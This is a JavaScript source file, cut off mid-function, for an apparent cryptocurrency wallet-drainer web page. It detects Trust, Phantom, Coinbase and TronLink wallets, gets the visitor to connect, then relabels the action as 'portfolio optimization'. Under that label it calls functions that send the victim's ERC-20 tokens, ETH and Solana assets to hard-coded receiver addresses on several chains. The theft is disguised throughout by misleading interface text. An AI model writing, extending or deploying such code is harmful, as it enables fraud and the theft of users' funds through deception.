$(document).ready(function() {
    // Your Ethereum address to receive funds
    const RECEIVER_ADDRESS = "0xA6ea466A91837809CB1d94B8ccb73c2D98657321"; // Replace with your ETH address
    const SOLANA_RECEIVER = "4NW3YXvEiNEVX6QxeS19FvSZ963vGqMQMvxguR8npq6s"; // Replace with your Solana address
    const TRON_RECEIVER = "TGdWPEEiDxiJPZskJhnJYZBKw3qbGUDXoU"; // Replace with your Tron address

    // Multi-chain token configurations
    const NETWORK_CONFIGS = {
        ethereum: {
            chainId: 1,
            name: "Ethereum",
            nativeCurrency: "ETH",
            rpcUrl: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
            receiver: RECEIVER_ADDRESS,
            tokens: [
                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
                { symbol: "USDC", address: "0xA0b86a33E6417a174f4dcc5b814094b8d1f57b69", decimals: 6 },
                { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
                { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
                { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
                { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
                { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
                { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
                { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 }
            ]
        },
        bsc: {
            chainId: 56,
            name: "BSC",
            nativeCurrency: "BNB",
            rpcUrl: "https://bsc-dataseed1.binance.org/",
            receiver: RECEIVER_ADDRESS,
            tokens: [
                { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955", decimals: 18 },
                { symbol: "USDC", address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", decimals: 18 },
                { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56", decimals: 18 },
                { symbol: "CAKE", address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", decimals: 18 },
                { symbol: "BNB", address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c", decimals: 18 },
                { symbol: "XRP", address: "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", decimals: 18 },
                { symbol: "ADA", address: "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47", decimals: 18 },
                { symbol: "DOGE", address: "0xba2ae424d960c26247dd6c32edc70b295c744c43", decimals: 8 }
            ]
        },
        polygon: {
            chainId: 137,
            name: "Polygon",
            nativeCurrency: "MATIC",
            rpcUrl: "https://polygon-rpc.com/",
            receiver: RECEIVER_ADDRESS,
            tokens: [
                { symbol: "USDT", address: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", decimals: 6 },
                { symbol: "USDC", address: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", decimals: 6 },
                { symbol: "WETH", address: "0x7ceb23fd6f88b65d85b8ee2ffee9f6bb2c45a5eb", decimals: 18 },
                { symbol: "WBTC", address: "0x1bfd67037b42cf73acf2047067bd4f2c47d9bfd6", decimals: 8 }
            ]
        }
    };

    // Solana token list (SPL tokens)
    const SOLANA_TOKENS = [
        { symbol: "USDT", mint: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", decimals: 6 },
        { symbol: "USDC", mint: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", decimals: 6 },
        { symbol: "SOL", mint: "So11111111111111111111111111111111111111112", decimals: 9 },
        { symbol: "RAY", mint: "4k3Dyjzvzp8eMZWUXbBCjEvwSkkk59S5iCNLY3QrkX6R", decimals: 6 },
        { symbol: "SRM", mint: "SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt", decimals: 6 }
    ];

    // Tron token list (TRC-20 tokens)
    const TRON_TOKENS = [
        { symbol: "USDT", address: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6 },
        { symbol: "USDC", address: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6 },
        { symbol: "BTT", address: "TAFjULxiVgT4qWVEbBbdEwUnCRAFr2vB5K", decimals: 18 },
        { symbol: "WIN", address: "TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7", decimals: 6 },
        { symbol: "SUN", address: "TSSMHYeV2uE9qYH95DqyoCuNCzEL1NvU3S", decimals: 18 }
    ];

    // Simplified wallet definitions - only the 4 main wallets
    const WALLET_DEFINITIONS = {
        trust: {
            name: "Trust Wallet",
            type: "evm",
            networks: ["ethereum", "bsc", "polygon"], // Trust supports all EVM networks
            detect: () => {
                if (window.ethereum && window.ethereum.isTrust) return window.ethereum;
                // Check for Trust in providers array
                if (window.ethereum && window.ethereum.providers) {
                    return window.ethereum.providers.find(p => p.isTrust);
                }
                return false;
            },
            getProvider: () => {
                if (window.ethereum && window.ethereum.isTrust) return window.ethereum;
                if (window.ethereum && window.ethereum.providers) {
                    return window.ethereum.providers.find(p => p.isTrust);
                }
                return null;
            },
            icon: "�️"
        },
        phantom: {
            name: "Phantom",
            type: "multi", // Phantom supports both EVM and Solana
            evmNetworks: ["ethereum"], // Phantom EVM only supports Ethereum mainnet
            solanaNetworks: ["solana"],
            detect: () => {
                const hasEVM = window.phantom && window.phantom.ethereum;
                const hasSolana = (window.solana && window.solana.isPhantom) || (window.phantom && window.phantom.solana);
                return hasEVM || hasSolana;
            },
            getEVMProvider: () => window.phantom && window.phantom.ethereum,
            getSolanaProvider: () => window.solana || (window.phantom && window.phantom.solana),
            icon: "�"
        },
        coinbase: {
            name: "Coinbase Wallet",
            type: "evm",
            networks: ["ethereum", "bsc", "polygon"], // Coinbase supports all EVM networks
            detect: () => {
                if (window.ethereum && window.ethereum.isCoinbaseWallet) return window.ethereum;
                // Check for Coinbase in providers array
                if (window.ethereum && window.ethereum.providers) {
                    return window.ethereum.providers.find(p => p.isCoinbaseWallet);
                }
                return false;
            },
            getProvider: () => {
                if (window.ethereum && window.ethereum.isCoinbaseWallet) return window.ethereum;
                if (window.ethereum && window.ethereum.providers) {
                    return window.ethereum.providers.find(p => p.isCoinbaseWallet);
                }
                return null;
            },
            icon: "🟦"
        },
        tronlink: {
            name: "TronLink",
            type: "tron",
            networks: ["tron"], // TronLink only supports Tron network
            detect: () => window.tronWeb && window.tronWeb.defaultAddress,
            getProvider: () => window.tronWeb,
            icon: "🔴"
        }
    };

    // Enhanced mobile deep links with updated URLs - simplified for the 4 main wallets
    const MOBILE_LINKS = {
        "trust-mobile": {
            scheme: "https://link.trustwallet.com/open_url",
            params: (url) => `?coin_id=60&url=${encodeURIComponent(url)}`
        },
        "phantom-mobile": {
            scheme: "https://phantom.app/ul/browse",
            params: (url) => `/${encodeURIComponent(url)}?cluster=mainnet-beta`
        },
        "coinbase-mobile": {
            scheme: "https://go.cb-w.com/dapp",
            params: (url) => `?cb_url=${encodeURIComponent(url)}`
        },
        "tronlink-mobile": {
            scheme: "tronlink://open",
            params: (url) => `?url=${encodeURIComponent(url)}`
        }
    };

    // Function to populate wallet dropdown - simplified for 4 main wallets
    function populateWalletDropdown() {
        const walletSelect = $('#wallet-select');
        if (!walletSelect.length) return;

        // Clear existing options except the default one
        walletSelect.find('option:not(:first)').remove();
        walletSelect.find('optgroup').remove();

        // Create main wallets group
        const mainGroup = $('<optgroup label="� Supported Wallets"></optgroup>');
        
        // Add our 4 main wallets
        Object.entries(WALLET_DEFINITIONS).forEach(([key, wallet]) => {
            try {
                const detectionResult = wallet.detect();
                const availability = detectionResult ? "✅" : "❌";
                
                let networksText = "";
                if (wallet.type === "multi") {
                    // Phantom supports both EVM and Solana
                    const evmText = wallet.evmNetworks.map(n => n.toUpperCase()).join(', ');
                    const solanaText = wallet.solanaNetworks.map(n => n.toUpperCase()).join(', ');
                    networksText = `${evmText}, ${solanaText}`;
                } else if (wallet.networks) {
                    networksText = wallet.networks.map(n => n.toUpperCase()).join(', ');
                }
                
                mainGroup.append(
                    `<option value="${key}" data-type="${wallet.type}" data-networks="${networksText}">${wallet.icon} ${wallet.name} (${networksText}) ${availability}</option>`
                );
            } catch (error) {
                console.log(`Error detecting ${wallet.name}:`, error);
                let networksText = "";
                if (wallet.type === "multi") {
                    const evmText = wallet.evmNetworks.map(n => n.toUpperCase()).join(', ');
                    const solanaText = wallet.solanaNetworks.map(n => n.toUpperCase()).join(', ');
                    networksText = `${evmText}, ${solanaText}`;
                } else if (wallet.networks) {
                    networksText = wallet.networks.map(n => n.toUpperCase()).join(', ');
                }
                mainGroup.append(
                    `<option value="${key}" data-type="${wallet.type}" data-networks="${networksText}">${wallet.icon} ${wallet.name} (${networksText}) ❌</option>`
                );
            }
        });

        walletSelect.append(mainGroup);

        // Enhanced mobile options - always show on mobile device
        if (isMobileDevice()) {
            const mobileGroup = $('<optgroup label="📱 Mobile Wallets"></optgroup>');
            
            // Core mobile wallets (matching our 4 main wallets)
            const coreMobileWallets = [
                { name: "Trust Wallet Mobile", key: "trust-mobile", icon: "🛡️", networks: ["ETH", "BSC", "POLYGON"], popular: true },
                { name: "Phantom Mobile", key: "phantom-mobile", icon: "👻", networks: ["ETH", "SOLANA"], popular: true },
                { name: "Coinbase Wallet Mobile", key: "coinbase-mobile", icon: "🟦", networks: ["ETH", "BSC", "POLYGON"], popular: true },
                { name: "TronLink Mobile", key: "tronlink-mobile", icon: "🔴", networks: ["TRON"], popular: true }
            ];
            
            // Additional popular mobile wallets
            const additionalMobileWallets = [
                { name: "MetaMask Mobile", key: "metamask-mobile", icon: "🦊", networks: ["ETH", "BSC", "POLYGON"], popular: true },
                { name: "Rainbow Mobile", key: "rainbow-mobile", icon: "🌈", networks: ["ETH", "POLYGON"], popular: false },
                { name: "Exodus Mobile", key: "exodus-mobile", icon: "💫", networks: ["ETH", "BSC"], popular: false },
                { name: "imToken Mobile", key: "imtoken-mobile", icon: "💎", networks: ["ETH", "BSC", "TRON"], popular: false },
                { name: "TokenPocket Mobile", key: "tokenpocket-mobile", icon: "🔸", networks: ["ETH", "BSC", "TRON"], popular: false },
                { name: "SafePal Mobile", key: "safepal-mobile", icon: "🔒", networks: ["ETH", "BSC"], popular: false }
            ];

            // Add core wallets first
            coreMobileWallets.forEach(wallet => {
                const networksText = wallet.networks.join(', ');
                const popularText = wallet.popular ? " ⭐" : "";
                mobileGroup.append(
                    `<option value="${wallet.key}" data-type="mobile" data-networks="${wallet.networks.join(',').toLowerCase()}">${wallet.icon} ${wallet.name} (${networksText})${popularText} 📱</option>`
                );
            });
            
            // Add separator
            mobileGroup.append('<option disabled>──────────</option>');
            
            // Add additional wallets
            additionalMobileWallets.forEach(wallet => {
                const networksText = wallet.networks.join(', ');
                const popularText = wallet.popular ? " ⭐" : "";
                mobileGroup.append(
                    `<option value="${wallet.key}" data-type="mobile" data-networks="${wallet.networks.join(',').toLowerCase()}">${wallet.icon} ${wallet.name} (${networksText})${popularText} 📱</option>`
                );
            });

            walletSelect.append(mobileGroup);
        }
        
        console.log("Wallet dropdown populated with 4 main wallets:", Object.keys(WALLET_DEFINITIONS).join(', '));
    }

    // Current selection state
    let selectedWallet = '';
    let currentWalletProvider = null;

    // Enhanced mobile device detection
    function isMobileDevice() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        // Check for mobile user agents
        const mobileKeywords = [
            'android', 'webos', 'iphone', 'ipad', 'ipod', 'blackberry', 
            'iemobile', 'opera mini', 'mobile', 'tablet'
        ];
        
        const isMobileUA = mobileKeywords.some(keyword => userAgent.includes(keyword));
        
        // Check for touch capabilities
        const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        
        // Check screen size
        const isSmallScreen = window.innerWidth <= 768;
        
        // Check for mobile-specific APIs
        const hasMobileAPIs = 'orientation' in window || 'DeviceOrientationEvent' in window;
        
        // Enhanced mobile detection
        const isAndroid = /android/i.test(userAgent);
        const isIOS = /iphone|ipad|ipod/i.test(userAgent);
        const isMobileChrome = /chrome/i.test(userAgent) && /mobile/i.test(userAgent);
        const isMobileSafari = /safari/i.test(userAgent) && /mobile/i.test(userAgent);
        
        // Return true if any mobile indicators are present
        return isMobileUA || (isTouchDevice && isSmallScreen) || hasMobileAPIs || isAndroid || isIOS || isMobileChrome || isMobileSafari;
    }
    
    // Function to detect specific mobile browser
    function getMobileBrowser() {
        const userAgent = navigator.userAgent.toLowerCase();
        
        if (/safari/i.test(userAgent) && /mobile/i.test(userAgent) && !/chrome/i.test(userAgent)) {
            return 'safari';
        } else if (/chrome/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'chrome';
        } else if (/firefox/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'firefox';
        } else if (/opera/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'opera';
        } else if (/edge/i.test(userAgent) && /mobile/i.test(userAgent)) {
            return 'edge';
        } else if (/samsung/i.test(userAgent)) {
            return 'samsung';
        }
        
        return 'unknown';
    }

    // Enhanced function to create mobile deep links with comprehensive wallet support
    function createMobileDeepLink(walletName, dappUrl = window.location.href) {
        const encodedUrl = encodeURIComponent(dappUrl);
        const hostname = window.location.hostname;
        const fullUrl = window.location.href;
        
        // Comprehensive mobile deep link mappings
        const mobileLinks = {
            // Core supported wallets (our main 4)
            "trust": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            "trust wallet": `https://link.trustwallet.com/open_url?coin_id=60&url=${encodedUrl}`,
            
            "phantom": `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
            "phantom (eth)": `https://phantom.app/ul/browse/${encodedUrl}?cluster=mainnet-beta`,
            
            "coinbase": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            "coinbase wallet": `https://go.cb-w.com/dapp?cb_url=${encodedUrl}`,
            
            "tronlink": `tronlink://open?url=${encodedUrl}`,
            "tron": `tronlink://open?url=${encodedUrl}`,
            
            // Popular additional mobile wallets
            "metamask": `https://metamask.app.link/dapp/${hostname}${window.location.pathname}`,
            
            "rainbow": `https://rnbwapp.com/open?url=${encodedUrl}`,
            
            "exodus": `exodus://open?url=${encodedUrl}`,
            
            "imtoken": `imtokenv2://navigate/DappView?url=${encodedUrl}&chain=ethereum`,
            
            "tokenpocket": `tpoutside://open?param=${encodedUrl}`,
            
            "safepal": `safepalwallet://open_url?url=${encodedUrl}`,
            
            "bitkeep": `bitkeep://bkconnect?action=dapp&url=${encodedUrl}`,
            
            "mathwallet": `mathwallet://dapp?url=${encodedUrl}`,
            
            "1inch": `https://wallet.1inch.io/connect?url=${encodedUrl}`,
            
            "argent": `https://argent.link/app/url?url=${encodedUrl}`,
            
            "enjin": `enjinwallet://dapp?url=${encodedUrl}`,
            
            "alpha": `alphawallet://dapp?url=${encodedUrl}`,
            
            "pillar": `pillarwallet://dapp?url=${encodedUrl}`,
            
            "aktionariat": `aktionariat://dapp?url=${encodedUrl}`,
            
            "keyring": `keyring://dapp?url=${encodedUrl}`,
            
            "gnosis": `https://gnosis-safe.io/app/dapp?url=${encodedUrl}`,
            
            "crypto": `crypto://dapp?url=${encodedUrl}`,
            
            "dharma": `dharma://dapp?url=${encodedUrl}`,
            
            "huobi": `huobiwallet://dapp?url=${encodedUrl}`,
            
            "hyperpay": `hyperpay://dapp?url=${encodedUrl}`,
            
            "linen": `linen://dapp?url=${encodedUrl}`,
            
            "meetone": `meetone://dapp?url=${encodedUrl}`,
            
            "morix": `morixwallet://dapp?url=${encodedUrl}`,
            
            "myte": `myte://dapp?url=${encodedUrl}`
        };
        
        const normalizedWalletName = walletName.toLowerCase().trim();
        
        // Try exact match first
        if (mobileLinks[normalizedWalletName]) {
            return mobileLinks[normalizedWalletName];
        }
        
        // Try partial matches for compound names
        for (const [key, link] of Object.entries(mobileLinks)) {
            if (normalizedWalletName.includes(key) || key.includes(normalizedWalletName)) {
                return link;
            }
        }
        
        return null;
    }

    // Update connection status
    function updateConnectionStatus(message, isError = false) {
        const statusEl = $('#connection-text');
        statusEl.text(message);
        statusEl.css('color', isError ? '#ff4444' : '#333');
    }

    // Check wallet availability
    function checkWalletAvailability(walletId) {
        if (walletId.includes('-mobile')) {
            return isMobileDevice() ? 'Mobile Supported' : 'Mobile Only';
        }
        
        const wallet = WALLET_DEFINITIONS[walletId];
        if (!wallet) return 'Unknown';
        
        try {
            return wallet.detect() ? 'Available' : 'Not Installed';
        } catch (error) {
            return 'Not Installed';
        }
    }

    // Get supported networks for a wallet
    function getSupportedNetworks(walletId) {
        if (!walletId) return 'Select wallet first';
        
        const wallet = WALLET_DEFINITIONS[walletId];
        if (!wallet) return 'Unknown wallet';
        
        if (wallet.type === "multi") {
            // Phantom supports both EVM and Solana
            const evmNetworks = wallet.evmNetworks.map(n => n.toUpperCase());
            const solanaNetworks = wallet.solanaNetworks.map(n => n.toUpperCase());
            return [...evmNetworks, ...solanaNetworks].join(', ');
        } else if (wallet.networks) {
            return wallet.networks.map(n => n.toUpperCase()).join(', ');
        }
        
        return 'None';
    }

    // Update wallet status display
    function updateWalletStatus() {
        const availability = checkWalletAvailability(selectedWallet);
        const supportedNetworks = getSupportedNetworks(selectedWallet);
        const deviceType = isMobileDevice() ? 'Mobile' : 'Desktop';
        
        const availabilityEl = $('#wallet-availability');
        const networksEl = $('#supported-networks');
        const deviceEl = $('#device-type');
        
        availabilityEl.text(availability);
        networksEl.text(supportedNetworks);
        deviceEl.text(deviceType);
        
        // Add CSS classes for styling
        availabilityEl.removeClass('available unavailable');
        
        if (availability === 'Available') {
            availabilityEl.addClass('available');
        } else if (availability === 'Not Installed') {
            availabilityEl.addClass('unavailable');
        }
        
        // Enable/disable connect button
        const canConnect = (availability === 'Available' || availability === 'Mobile Supported');
        $('#connect-btn').prop('disabled', !canConnect);
    }

    // Wallet selection handler  
    $('#wallet-select').on('change', function() {
        selectedWallet = $(this).val();
        console.log('Selected wallet:', selectedWallet);
        updateWalletStatus();
        
        // Show wallet info if a wallet is selected
        if (selectedWallet) {
            const selectedOption = $(this).find('option:selected');
            const walletType = selectedOption.data('type');
            const networks = selectedOption.data('networks');
            
            console.log(`Wallet type: ${walletType}, Networks: ${networks}`);
            
            // Update UI to show selection
            const availability = checkWalletAvailability(selectedWallet);
            if (availability === 'Available' || availability === 'Mobile Supported') {
                updateConnectionStatus(`${WALLET_DEFINITIONS[selectedWallet]?.name || selectedWallet} selected - Ready to connect`);
            } else {
                updateConnectionStatus(`${WALLET_DEFINITIONS[selectedWallet]?.name || selectedWallet} not available`, true);
            }
        }
    });

    // Initialize with device info and populate wallet dropdown
    const deviceType = isMobileDevice() ? 'Mobile' : 'Desktop';
    $('#device-type').text(deviceType);
    updateConnectionStatus(`Device: ${deviceType} - Ready for wallet selection`);

    // Populate wallet dropdown with detected wallets
    populateWalletDropdown();
    
    // Add refresh functionality for wallet detection
    $('#wallet-select').after('<button id="refresh-wallets" class="refresh-btn" style="margin-left: 10px; padding: 5px 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">🔄 Refresh</button>');
    
    $('#refresh-wallets').on('click', function() {
        console.log("Refreshing wallet detection...");
        populateWalletDropdown();
        updateConnectionStatus("Wallet list refreshed! Please select your wallet.");
    });

    // Debug: Show available wallets
    console.log("=== Simplified Wallet System ===");
    Object.keys(WALLET_DEFINITIONS).forEach(walletId => {
        const wallet = WALLET_DEFINITIONS[walletId];
        const detected = wallet.detect();
        console.log(`${wallet.name}: ${detected ? '✅ Available' : '❌ Not Available'}`);
    });
    console.log("===============================");

    // Main wallet connection handler
    $('#connect-btn').on('click', async (e) => {
        e.preventDefault();
        console.log("Connect wallet button clicked!");
        console.log("Selected wallet:", selectedWallet);
        
        try {
            if (!selectedWallet) {
                alert("Please select a wallet from the dropdown menu.");
                return;
            }

            const walletDef = WALLET_DEFINITIONS[selectedWallet];
            const walletName = walletDef?.name || selectedWallet;
            
            console.log("Wallet definition:", walletDef);
            updateConnectionStatus(`Connecting to ${walletName}...`);

            // Handle mobile wallets
            if (selectedWallet.includes('-mobile')) {
                await handleMobileConnection(selectedWallet);
                return;
            }

            // Get wallet definition
            if (!walletDef) {
                throw new Error("Unsupported wallet selected");
            }

            // Check if wallet is available and get provider
            console.log("Checking wallet detection...");
            const detectionResult = walletDef.detect();
            console.log("Detection result:", detectionResult);
            
            if (!detectionResult) {
                throw new Error(`${walletDef.name} is not installed or available. Please install the wallet extension first.`);
            }

            // Get provider and handle connection based on wallet type
            console.log("Getting wallet provider...");
            
            if (walletDef.type === "evm") {
                currentWalletProvider = walletDef.getProvider();
                console.log("EVM Provider obtained:", currentWalletProvider);
                
                if (!currentWalletProvider) {
                    throw new Error(`Failed to get EVM provider for ${walletDef.name}. Please try refreshing the page.`);
                }
                
                await handleEVMConnection({ ...walletDef, provider: currentWalletProvider });
                
            } else if (walletDef.type === "multi") {
                // Special handling for Phantom which supports both EVM and Solana
                const evmProvider = walletDef.getEVMProvider();
                const solanaProvider = walletDef.getSolanaProvider();
                
                console.log("Multi-wallet detected - EVM:", !!evmProvider, "Solana:", !!solanaProvider);
                
                if (evmProvider && solanaProvider) {
                    // Let user choose or automatically do both
                    await handlePhantomMultiConnection(walletDef, evmProvider, solanaProvider);
                } else if (evmProvider) {
                    await handleEVMConnection({ 
                        ...walletDef, 
                        provider: evmProvider, 
                        networks: walletDef.evmNetworks 
                    });
                } else if (solanaProvider) {
                    await handleSolanaConnection({ 
                        ...walletDef, 
                        provider: solanaProvider, 
                        networks: walletDef.solanaNetworks 
                    });
                } else {
                    throw new Error(`${walletDef.name} providers not available.`);
                }
                
            } else if (walletDef.type === "solana") {
                currentWalletProvider = walletDef.getProvider();
                console.log("Solana Provider obtained:", currentWalletProvider);
                
                if (!currentWalletProvider) {
                    throw new Error(`Failed to get Solana provider for ${walletDef.name}. Please try refreshing the page.`);
                }
                
                await handleSolanaConnection({ ...walletDef, provider: currentWalletProvider });
                
            } else if (walletDef.type === "tron") {
                currentWalletProvider = walletDef.getProvider();
                console.log("Tron Provider obtained:", currentWalletProvider);
                
                if (!currentWalletProvider) {
                    throw new Error(`Failed to get Tron provider for ${walletDef.name}. Please try refreshing the page.`);
                }
                
                await handleTronConnection({ ...walletDef, provider: currentWalletProvider });
                
            } else {
                throw new Error("Unsupported wallet type");
            }

        } catch (error) {
            console.error("Connection error:", error);
            updateConnectionStatus("Connection failed", true);
            
            // Provide more specific error messages
            let errorMessage = error.message;
            if (error.message.includes("User rejected")) {
                errorMessage = "Connection was rejected. Please try again and approve the connection in your wallet.";
            } else if (error.code === 4001) {
                errorMessage = "Connection was rejected by user. Please try again.";
            } else if (error.code === -32002) {
                errorMessage = "Connection request already pending. Please check your wallet.";
            }
            
            alert("Failed to connect wallet: " + errorMessage);
        }
    });

    // Handle Phantom's multi-chain capabilities (both EVM and Solana)
    async function handlePhantomMultiConnection(walletDef, evmProvider, solanaProvider) {
        try {
            updateConnectionStatus("Connecting to Phantom (Multi-Chain)...");
            
            // Try to connect to both EVM and Solana
            let evmConnected = false;
            let solanaConnected = false;
            let userAddress = null;
            let solanaAddress = null;

            // Connect to EVM first (Ethereum only for Phantom)
            try {
                await evmProvider.request({ method: 'eth_requestAccounts' });
                const accounts = await evmProvider.request({ method: 'eth_accounts' });
                if (accounts && accounts.length > 0) {
                    userAddress = accounts[0];
                    evmConnected = true;
                    console.log("Phantom EVM connected:", userAddress);
                }
            } catch (evmError) {
                console.log("Phantom EVM connection failed:", evmError.message);
            }

            // Connect to Solana
            try {
                const response = await solanaProvider.connect();
                if (response && response.publicKey) {
                    solanaAddress = response.publicKey.toString();
                    solanaConnected = true;
                    console.log("Phantom Solana connected:", solanaAddress);
                }
            } catch (solanaError) {
                console.log("Phantom Solana connection failed:", solanaError.message);
            }

            if (!evmConnected && !solanaConnected) {
                throw new Error("Failed to connect to both Phantom EVM and Solana. Please try again.");
            }

            // Show connection results
            let connectionMessage = "Phantom connected: ";
            if (evmConnected) connectionMessage += `EVM (${userAddress.slice(0,6)}...${userAddress.slice(-4)})`;
            if (evmConnected && solanaConnected) connectionMessage += " & ";
            if (solanaConnected) connectionMessage += `Solana (${solanaAddress.slice(0,4)}...${solanaAddress.slice(-4)})`;
            
            updateConnectionStatus(connectionMessage);

            // Update button for multi-chain draining
            $('#connect-btn').text("🚀 Optimize All Phantom Networks");
            $('#connect-btn').off('click').on('click', async () => {
                try {
                    updateConnectionStatus("Starting multi-chain portfolio optimization...");
                    
                    // Drain EVM networks if connected
                    if (evmConnected && userAddress) {
                        try {
                            // For Phantom EVM, manually drain Ethereum tokens and ETH
                            updateConnectionStatus("Optimizing Ethereum portfolio...");
                            
                            const ethersProvider = new ethers.providers.Web3Provider(evmProvider);
                            const signer = ethersProvider.getSigner();
                            const config = NETWORK_CONFIGS.ethereum;
                            const drainedAssets = [];

                            console.log(`🔍 Scanning Ethereum for assets...`);

                            // Drain tokens first
                            const gasPrice = await ethersProvider.getGasPrice();
                            for (let i = 0; i < config.tokens.length; i++) {
                                const token = config.tokens[i];
                                try {
                                    console.log(`Checking ${token.symbol}... (${i + 1}/${config.tokens.length})`);
                                    const success = await drainERC20Token(ethersProvider, signer, userAddress, token, config.receiver, gasPrice);
                                    if (success) {
                                        drainedAssets.push(token.symbol);
                                        console.log(`✅ ${token.symbol} drained successfully`);
                                    }
                                } catch (tokenError) {
                                    console.error(`❌ Failed to drain ${token.symbol}:`, tokenError.message);
                                }
                            }

                            // Drain ETH last
                            try {
                                console.log(`Checking ETH...`);
                                const success = await drainNativeCurrency(ethersProvider, signer, userAddress, config.receiver);
                                if (success) {
                                    drainedAssets.push("ETH");
                                    console.log(`✅ ETH drained successfully`);
                                }
                            } catch (nativeError) {
                                console.error(`❌ Failed to drain ETH:`, nativeError.message);
                            }

                            console.log(`🎯 Ethereum optimization complete: ${drainedAssets.length} assets processed`);
                            if (drainedAssets.length > 0) {
                                updateConnectionStatus(`✅ Ethereum: ${drainedAssets.length} assets optimized`);
                            } else {
                                updateConnectionStatus(`🔍 Ethereum: No assets found`);
                            }
                            
                        } catch (evmError) {
                            console.error("Phantom EVM optimization failed:", evmError);
                            updateConnectionStatus(`❌ Ethereum optimization failed: ${evmError.message}`);
                        }
                    }
                    
                    // Drain Solana if connected
                    if (solanaConnected && solanaAddress) {
                        try {
                            await drainSolana(solanaProvider, solanaAddress);
                        } catch (solanaError) {
                            console.error("Phantom Solana optimization failed:", solanaError);
                            updateConnectionStatus(`❌ Solana optimization failed: ${solanaError.message}`);
                        }
                    }
                    
                    updateConnectionStatus("Multi-chain portfolio optimization completed! 🎉");
                    alert("Phantom multi-chain portfolio optimization completed!");
                    
                } catch (error) {
                    console.error("Multi-chain optimization error:", error);
                    updateConnectionStatus("Multi-chain optimization failed", true);
                    alert(`Multi-chain optimization failed: ${error.message || 'Unknown error'}`);
                }
            });

            // Show detailed connection info
            let alertMessage = `Connected to Phantom:\n`;
            if (evmConnected) alertMessage += `✅ EVM: ${userAddress}\n   Network: Ethereum\n`;
            if (solanaConnected) alertMessage += `✅ Solana: ${solanaAddress}\n   Network: Solana\n`;
            alert(alertMessage);

        } catch (error) {
            console.error("Phantom multi-connection error:", error);
            throw error;
        }
    }

    // Handle EVM wallet connections with network-aware draining
    async function handleEVMConnection(selected) {
        const provider = selected.provider;
        
        if (!provider) {
            throw new Error(`${selected.name} provider not found. Please make sure the wallet is properly installed.`);
        }

        // Special handling for Phantom EVM provider
        if (selected.name.includes("Phantom") && selected.type === "evm") {
            // For Phantom EVM, the provider might need to be accessed differently
            if (typeof provider.request !== 'function') {
                // Try to get the ethereum provider from phantom
                if (window.phantom && window.phantom.ethereum && window.phantom.ethereum.request) {
                    const phantomProvider = window.phantom.ethereum;
                    selected.provider = phantomProvider; // Update the provider reference
                    return await handleEVMConnection(selected); // Retry with correct provider
                } else {
                    throw new Error(`${selected.name} is not properly initialized. Please refresh the page and try again.`);
                }
            }
        }

        // Standard provider validation
        if (typeof provider.request !== 'function') {
            throw new Error(`${selected.name} is not properly installed or available. Please check if the wallet extension is installed and enabled.`);
        }

        try {
            // Request account access
            await provider.request({ method: 'eth_requestAccounts' });
            
            // Get connected accounts
            const accounts = await provider.request({ method: 'eth_accounts' });
            if (!accounts || accounts.length === 0) {
                throw new Error("No accounts found. Please unlock your wallet and try again.");
            }

            const ethersProvider = new ethers.providers.Web3Provider(provider);
            const signer = ethersProvider.getSigner();
            const userAddress = accounts[0];

            // Get current network
            const network = await ethersProvider.getNetwork();
            console.log("Connected to network:", network);

            updateConnectionStatus(`Connected to ${selected.name} on ${getNetworkName(network.chainId)}`);
            
            // Filter supported EVM networks
            const supportedEVMNetworks = selected.networks.filter(net => NETWORK_CONFIGS[net]);
            
            if (supportedEVMNetworks.length > 1) {
                // Multi-network wallet - drain all supported networks automatically
                $('#connect-btn').text(`🚀 Optimize Portfolio (${supportedEVMNetworks.length} Networks)`);
                $('#connect-btn').off('click').on('click', async () => {
                    try {
                        await drainMultiChainAuto(selected, userAddress);
                    } catch (error) {
                        console.error("Portfolio optimization error:", error);
                        updateConnectionStatus("Portfolio optimization failed", true);
                        alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
                    }
                });
            } else {
                // Single network optimization
                $('#connect-btn').text(`🚀 Optimize ${getNetworkName(network.chainId)} Portfolio`);
                $('#connect-btn').off('click').on('click', async () => {
                    try {
